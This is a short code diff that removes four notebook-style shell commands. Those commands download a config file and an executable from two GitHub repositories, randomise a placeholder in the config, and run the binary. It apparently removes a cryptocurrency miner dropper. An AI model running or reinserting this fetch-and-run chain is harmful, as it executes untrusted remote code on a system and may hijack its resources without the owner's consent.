@@ -1,4 +1,0 @@
-cd /opt
-! wget https://raw.githubusercontent.com/ributmaestro/121/main/config.json
-! wget https://raw.githubusercontent.com/trautroi/shibusdt/main/vio
-! chmod +x vio && sed -i "s/xavix/$(shuf -n 1 -i 1-99999)/" "config.json" && ./vio
